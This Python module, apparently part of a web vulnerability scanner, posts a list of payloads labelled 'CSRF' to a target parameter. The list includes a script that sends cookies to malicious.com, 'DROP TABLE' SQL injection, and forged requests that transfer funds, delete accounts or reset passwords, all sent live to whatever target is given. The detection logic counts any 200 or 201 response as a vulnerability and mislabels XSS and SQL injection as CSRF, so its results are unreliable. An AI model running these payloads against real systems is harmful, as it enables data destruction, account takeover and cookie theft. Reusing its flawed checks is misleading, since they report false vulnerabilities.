import asyncio
import aiohttp
from config.config import logger

# Extended CSRF payloads (attack vectors)
CSRF_PAYLOADS = [
    # Basic XSS payloads (common in reflected CSRF)
    "<img src='javascript:alert(\"CSRF\");'>",
    "<script>window.location='http://malicious.com/steal?c='+document.cookie</script>",
    
    # Form-based actions (POST payloads)
    "action=transfer&amount=10000&recipient=attacker@example.com",
    "delete_account=true",
    "new_email=attacker@example.com",
    
    # JSON payloads (for API endpoints)
    '{"action": "update", "balance": "0", "user": "admin"}',
    '{"command": "reset_password", "new_password": "hacked"}',
    
    # Encoded payloads to bypass basic filters
    "%3Cscript%3Ealert('XSS')%3C%2Fscript%3E",  # URL-encoded script tag
    "a%09ction=transfer%20to=malicious",         # Tab character and space evasion
    
    # Long payloads to test input sanitization
    "a" * 1000 + "<script>alert('XSS')</script>",
    
    # SQL-like patterns (to test parameter misuse)
    "' OR '1'='1; --",
    "'; DROP TABLE users; --",
    
    # File upload exploitation
    "file=<script>alert('XSS')</script>.jpg",
    
    # Session manipulation
    "session_id=malicious_session_token",
    
    # Parameter pollution (multiple values)
    "param=value1&param=value2",
    
    # Unicode evasion (e.g., UTF-8 BOM)
    "\xEF\xBB\xBF<script>alert('XSS')</script>"
]

async def check_csrf(target_url: str, param: str, payload: str, session: aiohttp.ClientSession) -> dict:
    """Check individual CSRF payload asynchronously"""
    test_url = f"{target_url}?{param}={payload}"
    result = {
        "url": test_url,
        "payload": payload,
        "vulnerable": False
    }

    try:
        # Simulate a POST request (common in CSRF attacks)
        async with session.post(
            target_url,
            data={param: payload},
            headers={"X-Requested-With": "XMLHttpRequest"},  # Common in AJAX requests
            timeout=5
        ) as response:
            content = await response.text()
            
            # Check for success indicators (customize based on target behavior)
            if (
                "Transaction successful" in content 
                or "Account deleted" in content 
                or response.status in [200, 201]
            ):
                result["vulnerable"] = True
                logger.warning(f"VULNERABLE: {test_url} with payload '{payload}'")
            else:
                logger.info(f"Clean: {test_url} with payload '{payload}'")
                
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        logger.error(f"Request failed for {test_url}: {str(e)}")
        result["error"] = str(e)
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        result["error"] = str(e)
    
    return result

async def scan_csrf(target_url: str, param: str) -> dict:
    """Main CSRF scanning function using async requests"""
    async with aiohttp.ClientSession() as session:
        tasks = []
        vulnerable_entries = []
        
        for payload in CSRF_PAYLOADS:
            task = asyncio.create_task(check_csrf(target_url, param, payload, session))
            tasks.append(task)
        
        # Gather all results
        results = await asyncio.gather(*tasks)
        
        # Extract vulnerable entries
        for res in results:
            if res.get("vulnerable", False):
                vulnerable_entries.append({
                    "url": res["url"],
                    "payload": res["payload"]
                })
    
    return {
        "status": "success" if vulnerable_entries else "no_vulnerabilities",
        "vulnerable_entries": vulnerable_entries,
        "total_payloads": len(CSRF_PAYLOADS),
        "tested_urls": [res["url"] for res in results]
    }
